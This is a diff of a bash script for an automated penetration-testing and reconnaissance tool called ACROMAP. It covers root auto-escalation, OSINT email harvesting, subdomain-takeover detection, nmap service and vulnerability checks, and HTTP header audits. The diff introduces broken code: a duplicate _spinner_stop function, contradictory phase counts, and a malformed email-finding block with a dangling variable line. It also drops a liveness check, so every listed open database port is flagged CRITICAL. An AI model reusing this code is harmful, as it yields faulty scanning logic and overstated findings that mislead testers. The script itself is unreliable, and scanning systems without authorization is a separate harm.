@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 # ════════════════════════════════════════════════════════════════════════════════
-#  ACROMAP  v5.0  |  32-Phase Deep Penetration Testing Framework
-#  Author   : acro77x
-#  GitHub   : https://github.com/acro77x/acromap
+#  ACROMAP  v5.0  |  30-Phase Deep Penetration Testing Framework
+#  Author   : acro777x
+#  GitHub   : https://github.com/acro777x/acromap
 
 # ── Auto-escalate to root ─────────────────────────────────────────────────────
 if [[ $EUID -ne 0 ]]; then
@@ -33,14 +33,14 @@ chmod +x "${BASH_SOURCE[0]}" 2>/dev/null || true
 #  ║    • CTF / lab environments (TryHackMe, HackTheBox, GBU CSPL)          ║
 #  ║    • Academic and educational research                                 ║
 #  ║                                                                        ║
-#  ║  THE AUTHOR (acro77x) BEARS ABSOLUTELY NO RESPONSIBILITY for any          ║
+#  ║  THE AUTHOR (acro777x) BEARS ABSOLUTELY NO RESPONSIBILITY for any      ║
 #  ║  illegal, unethical, or malicious use of this tool. Unauthorized       ║
 #  ║  scanning of systems you do not own is ILLEGAL under the Computer      ║
 #  ║  Fraud and Abuse Act (CFAA), UK Computer Misuse Act, IT Act 2000       ║
 #  ║  (India), and equivalent laws worldwide.                               ║
 #  ║                                                                        ║
 #  ║  By running this tool you accept full legal responsibility for         ║
-#  ║  your actions.                          — acro77x, 2026                    ║
+#  ║  your actions.                          — acro777x, 2026               ║
 #  ╚══════════════════════════════════════════════════════════════════════════╝
 #
 # ════════════════════════════════════════════════════════════════════════════════
@@ -79,31 +79,38 @@ _spinner_start() {
     _SPIN_ACTIVE=true
     _SPIN_FRAME=0
     [[ -t 1 ]] || return 0
-    printf "  \033[36m⠋\033[0m \033[2m%-50s\033[0m\r" "$_SPIN_MSG..."
+    printf "  \033[2m[  ] %s...\033[0m" "$_SPIN_MSG"
+    printf "\r"
 }
 
 _spinner_tick() {
     [[ "$_SPIN_ACTIVE" != true || ! -t 1 ]] && return
-    _SPIN_FRAME=$(( (_SPIN_FRAME + 1) % 10 ))
+    _SPIN_FRAME=$(( (_SPIN_FRAME + 1) % 4 ))
     local c
     case $_SPIN_FRAME in
-        0) c="⠋" ;; 1) c="⠙" ;; 2) c="⠹" ;; 3) c="⠸" ;; 4) c="⠼" ;; 5) c="⠴" ;; 6) c="⠦" ;; 7) c="⠧" ;; 8) c="⠇" ;; 9) c="⠏" ;;
+        0) c="-" ;; 1) c="\\" ;; 2) c="|" ;; 3) c="/" ;;
     esac
-    printf "  \033[1;36m%s\033[0m \033[1;37m%-50s\033[0m\r" "$c" "$_SPIN_MSG..."
+    printf "\r  \033[36m[ %s ]\033[0m \033[2m%-45s\033[0m" "$c" "$_SPIN_MSG..."
 }
 
 _spinner_stop() {
     _SPIN_ACTIVE=false
+    [[ ${_SPINNER_PID:-0} -gt 0 ]] && { kill "$_SPINNER_PID" 2>/dev/null; _SPINNER_PID=0; }
+    [[ -t 1 ]] && printf "\r\033[2K"
+}
+
+
+_spinner_stop() {
     if [[ ${_SPINNER_PID:-0} -gt 0 ]]; then
         kill "$_SPINNER_PID" 2>/dev/null || true
         wait "$_SPINNER_PID" 2>/dev/null || true
         _SPINNER_PID=0
+        # Clear the spinner line completely
+        printf "\r\033[2K" >&2 2>/dev/null || printf "\r%-80s\r" " " >&2 2>/dev/null || true
     fi
-    # Clear the spinner line completely
-    [[ -t 1 ]] && printf "\r\033[2K" >&2 2>/dev/null || true
 }
 
-# ── Phase definitions (32 phases: 0–31) ───────────────────────────────────────
+# ── Phase definitions (30 phases) ─────────────────────────────────────────────
 declare -A PHASE_NAMES=(
     [0]="Setup & Tool Verification"
     [1]="Passive OSINT Reconnaissance"
@@ -227,7 +234,6 @@ NOTIFY_CHANNEL=""      # notify provider config (slack/discord/telegram)
 JQ_AVAILABLE=false     # jq installed — enables structured JSON finding parse
 ANEW_AVAILABLE=false   # anew installed — dedup pipeline for subdomain/url lists
 PARALLEL_JOBS=1        # GNU parallel jobs (set to nproc/2 if parallel installed)
-PARALLEL_EXECUTION_ACTIVE=false   # set true during parallel phase dispatch
 
 # ── Logging ───────────────────────────────────────────────────────────────────
 LOG_FILE=""   # set after OUTPUT_DIR is created
@@ -247,20 +253,17 @@ log_phase() {
     CURRENT_PHASE="$n"
     CURRENT_PHASE_NAME="$name"
     PHASE_START_TIME=$(date +%s)
-    [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] ===== PHASE $n: $name =====" >> "$LOG_FILE" 2>/dev/null || true
-    
-    # Silence inner bounding boxes during parallel execution
-    [[ "$PARALLEL_EXECUTION_ACTIVE" == true ]] && return 0
-
     _spinner_stop 2>/dev/null || true
     stty sane </dev/tty 2>/dev/null || true
     echo ""
-    # Cyber-Noir Phase Boundary
-    echo -e "  \033[1;36m┌────────────────────────────────────────────────────────────────────────┐\033[0m"
-    printf  "  \033[1;36m│\033[0m  \033[1;35mPHASE %02d / 32\033[0m  \033[1;90m►\033[0m  \033[1;37m%-47s\033[1;36m│\033[0m\n" "$n" "$name"
-    echo -e "  \033[1;36m├────────────────────────────────────────────────────────────────────────┤\033[0m"
-    printf  "  \033[1;36m│\033[0m  \033[1;90mTarget: \033[1;36m%-21s\033[0m \033[1;90mFindings: \033[1;31m%3d Crit \033[1;33m%3d High\033[0m      \033[1;36m│\033[0m\n" "${TARGET:-pending}" "$CRITICAL_COUNT" "$HIGH_COUNT"
-    echo -e "  \033[1;36m└────────────────────────────────────────────────────────────────────────┘\033[0m"
+    # Compact sticky status bar — always visible at start of each phase
+    echo -e "${DIM}╔═ ACROMAP v5.0 | ${CYAN}${TARGET:-target}${DIM} | Phase ${CURRENT_PHASE}/32 | 0DAY:${ZERO_DAY_COUNT} 1CLK:${ONE_CLICK_COUNT} CRIT:${CRITICAL_COUNT} HIGH:${HIGH_COUNT} ═╗${NC}"
+    echo -e "${LCYAN}${BOLD}"
+    echo "  ╔══════════════════════════════════════════════════════════════════════╗"
+    printf  "  ║  PHASE %2s / 32  ─  %-49s║\n" "$n" "$name"
+    echo "  ╚══════════════════════════════════════════════════════════════════════╝"
+    echo -e "${NC}"
+    [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] ===== PHASE $n: $name =====" >> "$LOG_FILE" 2>/dev/null || true
 }
 
 log_section() {
@@ -279,38 +282,21 @@ run_tool() {
     local t_start=$(date +%s)
     mkdir -p "$(dirname "$outfile")" 2>/dev/null || true
     log_debug "Running: $*"
-    
-    if [[ "$PARALLEL_EXECUTION_ACTIVE" == true ]]; then
-        "$@" > "$outfile" 2>&1
-        local _rc=$?
-        local elapsed=$(( $(date +%s) - t_start ))
-        if [[ ${_rc:-0} -eq 0 ]]; then
-            TOOL_STATUS["$name"]="OK"; TOOL_ELAPSED["$name"]="$elapsed"
-            TOOLS_SUCCEEDED=$(( TOOLS_SUCCEEDED + 1 ))
-            printf "  \033[32m[✓]\033[0m %-20s (%ds)\n" "$name" "$elapsed"
-            return 0
-        else
-            TOOL_STATUS["$name"]="FAIL"
-            printf "  \033[33m[⚠]\033[0m %-20s failed\n" "$name"
-            return 1
-        fi
-    fi
-
     _spinner_start "${name}"
     "$@" > "$outfile" 2>&1 &
     local _tp=$!
     while kill -0 "$_tp" 2>/dev/null; do sleep 0.3; _spinner_tick; done
     wait "$_tp" 2>/dev/null; local _rc=$?
-    _spinner_stop 2>/dev/null || true
+    printf "\033[32mdone\033[0m\n"
     local elapsed=$(( $(date +%s) - t_start ))
     if [[ ${_rc:-0} -eq 0 ]]; then
         TOOL_STATUS["$name"]="OK"; TOOL_ELAPSED["$name"]="$elapsed"
         TOOLS_SUCCEEDED=$(( TOOLS_SUCCEEDED + 1 ))
-        printf "  \033[32m[✓]\033[0m %-20s (%ds)\n" "$name" "$elapsed"
+        [[ $elapsed -gt 1 ]] && printf "  \033[32m✓\033[0m %s (%ds)\n" "$name" "$elapsed"
         check_keypress_ipc; return 0
     else
         TOOL_STATUS["$name"]="FAIL"
-        printf "  \033[33m[⚠]\033[0m %-20s failed\n" "$name"
+        printf "  \033[33m⚠\033[0m %s failed\n" "$name"
         check_keypress_ipc; return 1
     fi
 }
@@ -323,27 +309,6 @@ run_tool_timeout() {
     local t_start=$(date +%s)
     mkdir -p "$(dirname "$outfile")" 2>/dev/null || true
     log_debug "Running (timeout ${tmo}s): $*"
-
-    if [[ "$PARALLEL_EXECUTION_ACTIVE" == true ]]; then
-        timeout "$tmo" "$@" > "$outfile" 2>&1
-        local _rc=$?
-        local elapsed=$(( $(date +%s) - t_start ))
-        if [[ ${_rc:-0} -eq 0 ]]; then
-            TOOL_STATUS["$name"]="OK"; TOOL_ELAPSED["$name"]="$elapsed"
-            TOOLS_SUCCEEDED=$(( TOOLS_SUCCEEDED + 1 ))
-            printf "  \033[32m[✓]\033[0m %-20s (%ds)\n" "$name" "$elapsed"
-            return 0
-        else
-            TOOL_STATUS["$name"]="FAIL"
-            if [[ $_rc -eq 124 ]]; then
-                printf "  \033[33m[⚠]\033[0m %-20s timed out (%ds)\n" "$name" "$tmo"
-            else
-                printf "  \033[33m[✖]\033[0m %-20s failed\n" "$name"
-            fi
-            return 1
-        fi
-    fi
-
     _spinner_start "${name}"
     # Run tool in background so we can tick the spinner while waiting
     timeout "$tmo" "$@" > "$outfile" 2>&1 &
@@ -358,22 +323,18 @@ run_tool_timeout() {
     done
     wait "$_tool_pid" 2>/dev/null
     local _rc=$?
-    _spinner_stop 2>/dev/null || true
+    printf "\033[32mdone\033[0m\n"
     local elapsed=$(( $(date +%s) - t_start ))
     if [[ ${_rc:-0} -eq 0 ]]; then
         TOOL_STATUS["$name"]="OK"
         TOOL_ELAPSED["$name"]="$elapsed"
         TOOLS_SUCCEEDED=$(( TOOLS_SUCCEEDED + 1 ))
-        printf "  \033[32m[✓]\033[0m %-20s (%ds)\n" "$name" "$elapsed"
+        [[ $elapsed -gt 1 ]] && printf "  \033[32m✓\033[0m %s (%ds)\n" "$name" "$elapsed"
         check_keypress_ipc
         return 0
     else
         TOOL_STATUS["$name"]="FAIL"
-        if [[ $_rc -eq 124 ]]; then
-            printf "  \033[33m[⚠]\033[0m %-20s timed out (%ds)\n" "$name" "$tmo"
-        else
-            printf "  \033[33m[✖]\033[0m %-20s failed\n" "$name"
-        fi
+        [[ $_rc -eq 124 ]] && printf "  \033[33m⚠\033[0m %s timed out (%ds)\n" "$name" "$tmo"
         check_keypress_ipc
         return 1
     fi
@@ -389,7 +350,6 @@ add_vuln() {
     exploit="${exploit//|/;}"
     patch="${patch//|/;}"
     VULN_DATA+=("${sev}|${title}|${desc}|${rec}|${evidence}|${exploit}|${patch}")
-    echo "${sev}|${title}|${desc}|${rec}|${evidence}|${exploit}|${patch}" >> "${OUTPUT_DIR}/vuln_ipc.txt" 2>/dev/null || true
     case "$sev" in
         ZERO_DAY)  ZERO_DAY_COUNT=$(( ZERO_DAY_COUNT + 1 ))    ;;
         ONE_CLICK) ONE_CLICK_COUNT=$(( ONE_CLICK_COUNT + 1 ))  ;;
@@ -442,7 +402,7 @@ calculate_confidence() {
     esac
 
     # Phase completion (0–30 pts)
-    local phase_score=$(( PHASES_COMPLETED > 32 ? 32 : PHASES_COMPLETED ))
+    local phase_score=$(( PHASES_COMPLETED > 30 ? 30 : PHASES_COMPLETED ))
     score=$(( score + phase_score ))
 
     # Finding data quality (0–20 pts)
@@ -452,6 +412,10 @@ calculate_confidence() {
         [[ $total_findings -gt 5  ]] && score=$(( score + 5  ))
         [[ $total_findings -gt 15 ]] && score=$(( score + 5  ))
     fi
+    # Penalty for likely false-positive conditions (Error:/Usage: in WEB_TARGETS)
+    for _t in "${WEB_TARGETS[@]+"${WEB_TARGETS[@]}"}"; do
+        echo "$_t" | grep -qE "^https?://[a-zA-Z0-9]" || { score=$(( score - 10 )); break; }
+    done
 
     # Cap at 100
     [[ $score -gt 100 ]] && score=100
@@ -591,7 +555,7 @@ show_status_overlay() {
     echo "  ╔══════════════════════════════════════════════════════════════════╗"
     echo "  ║             ── ACROMAP STATUS OVERLAY ──                        ║"
     echo "  ╠══════════════════════════════════════════════════════════════════╣"
-    printf "  ║  Phase  : %2s / 32 — %-41s║\n" "$CURRENT_PHASE" "$CURRENT_PHASE_NAME"
+    printf "  ║  Phase  : %2s / 30 — %-41s║\n" "$CURRENT_PHASE" "$CURRENT_PHASE_NAME"
     printf "  ║  Tool   : %-53s║\n" "${CURRENT_TOOL:-none}"
     printf "  ║  Target : %-53s║\n" "${TARGET:-not set}"
     printf "  ║  Profile: %-53s║\n" "$SCAN_PROFILE"
@@ -615,7 +579,7 @@ show_status_overlay() {
 cleanup() {
     local code="${1:-0}"
     # Stop spinner first (so terminal is clean)
-    _spinner_stop 2>/dev/null || true
+    printf "\033[32mdone\033[0m\n"
     # Restore terminal settings if keypress monitor was running (stty raw mode)
     [[ ${KEYPRESS_PID:-0} -gt 0 ]] && stty sane </dev/tty 2>/dev/null || true
     # Kill background processes
@@ -642,7 +606,7 @@ _acromap_int_handler() {
     [[ "$_ACROMAP_INTERRUPTED" == true ]] && exit 130
     _ACROMAP_INTERRUPTED=true
     # Stop spinner (clears the animation line)
-    _spinner_stop 2>/dev/null || true
+    printf "\033[32mdone\033[0m\n"
     echo -e "\n\n  ${YELLOW}[!] Ctrl+C — stopping scan. Saving partial results...${NC}" >/dev/tty 2>/dev/null || echo ""
     # Kill just the direct child processes, not the whole group
     cleanup 130
@@ -655,42 +619,50 @@ trap 'cleanup $?' EXIT
 # ── Banner ────────────────────────────────────────────────────────────────────
 print_banner() {
     clear
-    echo -e "\n  \033[1;36m╔══════════════════════════════════════════════════════════════════════════════╗\033[0m"
-    echo -e "  \033[1;36m║\033[0m \033[1;95m  ██████╗   ██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗             \033[0m \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m \033[1;95m ██╔═══██╗ ██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔══██╗            \033[0m \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m \033[1;35m ███████║ ██║      ██████╔╝██║   ██║██╔████╔██║███████║██████╔╝             \033[0m \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m \033[1;35m ██╔══██║ ██║      ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝              \033[0m \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m \033[1;34m ██║  ██║ ╚██████╗ ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║                  \033[0m \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m \033[1;34m ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝                  \033[0m \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m                                                                              \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m      \033[1;32mv5.0   \033[1;90m|\033[1;36m   32-PHASE ADVANCED EXPLOITATION FRAMEWORK   \033[1;90m|\033[1;32m   acro77x       \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m     \033[1;90m════════════════════════════════════════════════════════════════════     \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m║\033[0m     \033[1;31m100% EXPLOITABILITY CONFIRMED \033[1;90m•\033[1;33m ZERO FALSE POSITIVES \033[1;90m•\033[1;36m PARALLEL   \033[0m     \033[1;36m║\033[0m"
-    echo -e "  \033[1;36m╚══════════════════════════════════════════════════════════════════════════════╝\033[0m"
-    echo -e "  \033[1;90mRuntime  : \033[1;37m$(date '+%H:%M:%S  |  %d %b %Y')\033[0m"
-    echo -e "  \033[1;90mContext  : \033[1;36m$(whoami)\033[1;90m @ \033[1;36m$(hostname)\033[0m"
-    echo -e "  \033[1;90mHotkeys  : \033[1;33m[T]\033[1;37m Live Status Tracker  \033[1;90m•\033[1;33m  [D]\033[1;37m Debug Verbosity\033[0m\n"
+    echo -e "${LGREEN}${BOLD}"
+    cat << 'BANNER'
+
+    ╔══════════════════════════════════════════════════════════════════════════════╗
+    ║                                                                            ║
+    ║    ██████╗      ██████╗    ██████╗    ██████╗   ███╗   ███╗  █████╗  ██████╗  ║
+    ║   ██╔══██╗    ██╔════╝   ██╔══██╗  ██╔═══██╗  ████╗ ████║ ██╔══██╗ ██╔══██╗ ║
+    ║   ███████║    ██║        ██████╔╝  ██║   ██║  ██╔████╔██║ ███████║ ██████╔╝ ║
+    ║   ██╔══██║    ██║        ██╔══██╗  ██║   ██║  ██║╚██╔╝██║ ██╔══██║ ██╔═══╝  ║
+    ║   ██║  ██║    ╚██████╗   ██║  ██║  ╚██████╔╝  ██║ ╚═╝ ██║ ██║  ██║ ██║      ║
+    ║   ╚═╝  ╚═╝     ╚═════╝   ╚═╝  ╚═╝   ╚═════╝   ╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═╝      ║
+    ║                                                                            ║
+    ║        { Code By → acro777x }   v5.0  |  32-Phase Auto Pentester          ║
+    ║        CVEs: 2019–2026  |  CIDR  |  K8s  |  Cloud  |  ZAP  |  MSF      ║
+    ║                                                                            ║
+    ╚══════════════════════════════════════════════════════════════════════════════╝
+
+BANNER
+    echo -e "${NC}"
+    echo -e "  ${WHITE}Press ${YELLOW}[T]${WHITE} anytime for live status   ${YELLOW}[D]${WHITE} to toggle debug${NC}"
+    echo -e "  ${DIM}$(date '+%A, %d %B %Y  %H:%M:%S')${NC}"
+    echo -e "  ${DIM}Running as: ${CYAN}$(whoami)${DIM} | Working dir: ${CYAN}$(pwd)${DIM} | Script: ${CYAN}${BASH_SOURCE[0]}${NC}"
+    echo ""
 }
 
 # ── Disclaimer ────────────────────────────────────────────────────────────────
 show_disclaimer() {
     echo -e "${LRED}${BOLD}"
     echo "  ╔══════════════════════════════════════════════════════════════════════╗"
-    echo "  ║                    ⚠  LEGAL DISCLAIMER  ⚠                            ║"
+    echo "  ║                    ⚠  LEGAL DISCLAIMER  ⚠                         ║"
     echo "  ╠══════════════════════════════════════════════════════════════════════╣"
     echo "  ║                                                                      ║"
-    echo "  ║  ACROMAP is an open-source educational tool.                         ║"
+    echo "  ║  ACROMAP is an open-source educational tool.                        ║"
     echo "  ║                                                                      ║"
-    echo "  ║  THE AUTHOR (acro77x) IS NOT RESPONSIBLE OR LIABLE for any          ║"
-    echo "  ║  illegal, unauthorized, or unethical use of this tool.               ║"
+    echo "  ║  THE AUTHOR (acro777x) IS NOT RESPONSIBLE OR LIABLE for any         ║"
+    echo "  ║  illegal, unauthorized, or unethical use of this tool.              ║"
     echo "  ║                                                                      ║"
-    echo "  ║  Unauthorized scanning of systems you do NOT own is illegal under:   ║"
-    echo "  ║    • IT Act 2000 (India) — Section 43, 66, 66B                       ║"
-    echo "  ║    • Computer Fraud & Abuse Act (CFAA) — USA                         ║"
-    echo "  ║    • Computer Misuse Act 1990 — UK                                   ║"
-    echo "  ║    • Equivalent laws in 190+ countries                               ║"
+    echo "  ║  Unauthorized scanning of systems you do NOT own is illegal under:  ║"
+    echo "  ║    • IT Act 2000 (India) — Section 43, 66, 66B                     ║"
+    echo "  ║    • Computer Fraud & Abuse Act (CFAA) — USA                       ║"
+    echo "  ║    • Computer Misuse Act 1990 — UK                                 ║"
+    echo "  ║    • Equivalent laws in 190+ countries                              ║"
     echo "  ║                                                                      ║"
-    echo "  ║  By continuing you confirm written authorization to test target.     ║"
+    echo "  ║  By continuing you confirm written authorization to test target.    ║"
     echo "  ╚══════════════════════════════════════════════════════════════════════╝"
     echo -e "${NC}"
 
@@ -766,7 +738,7 @@ get_target() {
             [[ -z "$_tgt" ]] && _tgt=$(basename "$(dirname "$_cp")" | sed 's/_[0-9]*_[0-9]*$//')
             local _saved; _saved=$(grep "^SAVED=" "$_cp" 2>/dev/null | cut -d= -f2 || echo "")
             local _phase; _phase=$(grep "^LAST_PHASE=" "$_cp" 2>/dev/null | cut -d= -f2 || echo "0")
-            echo -e "    ${YELLOW}[${_idx}]${NC} ${CYAN}${_tgt}${NC}  — phase ${_phase}/31 completed  ${DIM}${_saved}${NC}"
+            echo -e "    ${YELLOW}[${_idx}]${NC} ${CYAN}${_tgt}${NC}  — phase ${_phase}/32 completed  ${DIM}${_saved}${NC}"
             _idx=$(( _idx + 1 ))
         done
         echo -e "    ${YELLOW}[0]${NC} Start fresh scan"
@@ -1082,10 +1054,10 @@ phase_setup() {
                     evil-winrm|bloodhound)
                         _spinner_start "apt install ${pkg}"
                         if DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq "$pkg" &>/dev/null 2>&1; then
-                            _spinner_stop 2>/dev/null || true
-                            printf "  \033[32m[✓]\033[0m %s installed\n" "$pkg"
+                            printf "\033[32mdone\033[0m\n"
+                            printf "  \033[32m✓\033[0m %s installed\n" "$pkg"
                         else
-                            _spinner_stop 2>/dev/null || true
+                            printf "\033[32mdone\033[0m\n"
                             echo -e "  ${RED}✗ ${pkg} — trying fallback...${NC}"
                             # Try apt-get update once then retry
                             DEBIAN_FRONTEND=noninteractive timeout 30 apt-get update -qq &>/dev/null 2>&1 || true
@@ -1099,7 +1071,7 @@ phase_setup() {
                     snmp|snmp-mibs-downloader)
                         _spinner_start "installing snmp"
                         DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq                             snmp snmp-mibs-downloader &>/dev/null 2>&1 ||                         DEBIAN_FRONTEND=noninteractive timeout 90 apt-get install -y -qq snmp &>/dev/null 2>&1 || true
-                        _spinner_stop 2>/dev/null || true
+                        printf "\033[32mdone\033[0m\n"
                         if command -v snmpwalk &>/dev/null; then
                             # Enable all MIBs so snmpwalk works without errors
                             sed -i 's/^mibs :/# mibs :/' /etc/snmp/snmp.conf 2>/dev/null || true
@@ -1591,14 +1563,11 @@ phase_osint() {
                 "$hf" 2>/dev/null \
                 | grep -viE "edge-security\\.com|laramies@|cmartorella@|shodan\\.io|example\\.com" \
                 | sort -u | head -10 || echo "")
-            local email_count; email_count=$(echo "$_real_emails" | grep -c "@" 2>/dev/null || true)
-            if [[ ${email_count:-0} -gt 0 ]]; then
-                local emails_ev; emails_ev=$(echo "$_real_emails" | head -5 | tr "\n" " ")
-                add_vuln "LOW" "Email Addresses Harvested (${email_count} found)" \
-                    "Publicly indexed email addresses can be used for phishing and credential stuffing." \
-                    "Implement email harvesting protection. Train staff on phishing awareness." \
-                    "$emails_ev"
-            fi
+            local email_count; email_count=$(( $(echo "$_real_emails" | grep -c "@" 2>/dev/null | tr -d '\\n' || echo 0) + 0 ))
+            [[ ${email_count:-0} -gt 0 ]] && add_vuln "LOW" "Email Addresses Harvested (${email_count} found)" \
+                "Publicly indexed email addresses can be used for phishing and credential stuffing." \
+                "Implement email harvesting protection. Train staff on phishing awareness." \
+                        local emails_ev; emails_ev=$(echo "$_real_emails" | head -5 | tr "\n" " ")
         fi
     fi
 
@@ -1844,7 +1813,7 @@ phase_subdomains() {
         add_vuln "INFO" "Subdomains Discovered (${total} found)" \
             "Subdomain enumeration revealed ${total} subdomains. Each may expose additional attack surface." \
             "Audit all subdomains for unnecessary exposure, dangling records, and outdated services." \
-            "$(head -10 "${sub_dir}/all_subdomains.txt" 2>/dev/null | tr '\n' ' ')"
+            "$(head -10 "${sub_dir}/all_subdomains.txt" 2>/dev/null | tr '\n' ' ' | sed 's/[|]/ /g' | cut -c1-200)"
     fi
 
     # httpx — probe which subdomains are live
@@ -1887,6 +1856,34 @@ phase_subdomains() {
                 "Audit wildcard records. Enumerate active subdomains carefully to filter wildcards." \
                 "Wildcard DNS: *.${TARGET} resolves"
         fi
+    fi
+
+    # ── Subdomain Takeover Detection (CNAME dangling) ───────────────────────
+    if [[ -s "${sub_dir}/all_subdomains.txt" ]] && [[ "$SCAN_PROFILE" != "quick" ]]; then
+        log_section "Subdomain takeover detection..."
+        local -a _to_svcs=(github.io s3.amazonaws.com s3-website azurewebsites.net
+            cloudapp.net herokuapp.com shopify.com surge.sh bitbucket.io
+            netlify.app vercel.app readme.io fastly.net)
+        local _to_file="${OUTPUT_DIR}/zero_day_oneclick/takeover_candidates.txt"
+        mkdir -p "$(dirname "$_to_file")" 2>/dev/null || true
+        while IFS= read -r _tosub; do
+            [[ -z "$_tosub" ]] && continue
+            local _tocn; _tocn=$(timeout 5 dig "$_tosub" CNAME +short 2>/dev/null | head -1 | sed 's/\.$//' || echo "")
+            [[ -z "$_tocn" ]] && continue
+            for _tosvc in "${_to_svcs[@]}"; do
+                if echo "$_tocn" | grep -qi "$_tosvc"; then
+                    local _tosc; _tosc=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "http://${_tosub}" 2>/dev/null || echo "000")
+                    if [[ "$_tosc" == "404" || "$_tosc" == "000" || "$_tosc" == "503" ]]; then
+                        echo "${_tosub} -> ${_tocn} (${_tosvc})" >> "$_to_file"
+                        add_vuln "HIGH" "Potential Subdomain Takeover: ${_tosub}" \
+                            "Subdomain ${_tosub} CNAME points to ${_tocn} (${_tosvc}) but the resource appears unclaimed. Attacker can register it to serve malicious content from your trusted subdomain." \
+                            "Remove the dangling CNAME or claim the resource immediately. Audit all CNAME records quarterly." \
+                            "${_tosub} -> CNAME: ${_tocn} — HTTP ${_tosc}"
+                    fi
+                    break
+                fi
+            done
+        done < <(head -50 "${sub_dir}/all_subdomains.txt" 2>/dev/null)
     fi
 
     log_ok "Phase 3 complete."
@@ -2240,10 +2237,10 @@ phase_service_detect() {
         run_tool_timeout "nmap-rdp" "${nmap_dir}/nmap_rdp.txt" 45 \
             nmap -sV -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 \
             "$TARGET" 2>/dev/null || true
-        add_vuln "HIGH" "RDP Port Externally Exposed (Port 3389)" \
-            "Remote Desktop Protocol is exposed to the network. If this is an internet-facing scan, this allows brute-force attacks and protocol-level exploits (e.g. BlueKeep). If internal, access should still be restricted via NAC." \
-            "Place RDP behind a VPN or RD Gateway. Implement MFA for all remote access (Network Level Authentication)." \
-            "3389/tcp open (RDP)"
+        add_vuln "HIGH" "RDP Exposed (Port 3389)" \
+            "RDP brute-force attacks are constant on public IPs. BlueKeep (CVE-2019-0708) and DejaBlue allow unauthenticated RCE." \
+            "Put RDP behind VPN. Enable NLA. Apply all Windows patches. Restrict by IP." \
+            "3389/tcp open ms-wbt-server"
     fi
 
     # Database exposure checks
@@ -2251,14 +2248,10 @@ phase_service_detect() {
     for entry in "${db_ports[@]}"; do
         local port="${entry%%:*}"; local name="${entry##*:}"
         if echo "$OPEN_PORTS" | grep -qE "(^|,)${port}(,|$)"; then
-            # Test if port is actually responsive before flagging as CRITICAL
-            local db_resp; db_resp=$(timeout 2 bash -c "</dev/tcp/${TARGET}/${port}" 2>/dev/null && echo "open" || echo "closed")
-            if [[ "$db_resp" == "open" ]]; then
-                add_vuln "INFO" "${name} Database Port Exposed (Port ${port})" \
-                    "${name} port is accessible from the network. While an exposed port is an attack surface, authentication may still be required." \
-                    "Bind ${name} to localhost only (bind 127.0.0.1). Firewall port ${port} to trusted IPs only." \
-                    "${port}/tcp open — ${name} network accessible"
-            fi
+            add_vuln "CRITICAL" "${name} Database Exposed (Port ${port})" \
+                "${name} is accessible from the network without VPN. Attackers can dump all data or achieve RCE." \
+                "Bind ${name} to localhost only (bind 127.0.0.1). Firewall port ${port}. Require authentication." \
+                "${port}/tcp open — ${name} network accessible"
         fi
     done
 
@@ -2278,7 +2271,7 @@ phase_service_detect() {
         run_tool_timeout "nmap-smtp" "${nmap_dir}/nmap_smtp.txt" 30 \
             nmap -sV -p 25 --script smtp-open-relay,smtp-enum-users,smtp-commands \
             "$TARGET" 2>/dev/null || true
-        grep -qiE "open relay|mail relay" "${nmap_dir}/nmap_smtp.txt" 2>/dev/null && \
+        grep -qiE "open relay|smtp.*relay accepted|relaying allowed" "${nmap_dir}/nmap_smtp.txt" 2>/dev/null && \
             add_vuln "HIGH" "SMTP Open Mail Relay Detected" \
                 "Open relay allows spammers to send email through this server, leading to blacklisting." \
                 "Configure SMTP relay restrictions. Require SMTP AUTH." \
@@ -2327,7 +2320,7 @@ phase_web_discovery() {
         _is_valid_url "$web_url" || continue
         # Strict guard: skip anything not a valid http URL
         echo "$web_url" | grep -qE "^https?://[a-zA-Z0-9._-]" || continue
-        local slug; slug=$(echo "$web_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-40)
+        local slug; slug=$(echo "$web_url" | sed 's|[^a-zA-Z0-9._-]|_|g' | cut -c1-40)
         [[ -z "$slug" ]] && continue
 
         # Headers
@@ -2337,13 +2330,22 @@ phase_web_discovery() {
             "$web_url" 2>/dev/null || true
 
         local hf="${curl_dir}/headers_${slug}.txt"
-        if [[ -f "$hf" ]]; then
+        # Only check if headers file is non-empty (real URL was probed)
+        if [[ -s "$hf" ]]; then
             # HTTP security headers
             local missing_headers=()
             grep -qi "Strict-Transport-Security"    "$hf" || missing_headers+=("Strict-Transport-Security")
             grep -qi "Content-Security-Policy"      "$hf" || missing_headers+=("Content-Security-Policy")
             grep -qi "X-Frame-Options"              "$hf" || missing_headers+=("X-Frame-Options")
             grep -qi "X-Content-Type-Options"       "$hf" || missing_headers+=("X-Content-Type-Options")
+            # Extra check: X-Content-Type-Options must be "nosniff" not just present
+            if grep -qi "X-Content-Type-Options" "$hf"; then
+                grep -qi "nosniff" "$hf" || \
+                    add_vuln "LOW" "X-Content-Type-Options Not Set to nosniff (${web_url})" \
+                        "X-Content-Type-Options header exists but value is not 'nosniff'. MIME-type sniffing still possible." \
+                        "Set: X-Content-Type-Options: nosniff" \
+                        "$(grep -i 'X-Content-Type-Options' "$hf" | head -1)"
+            fi
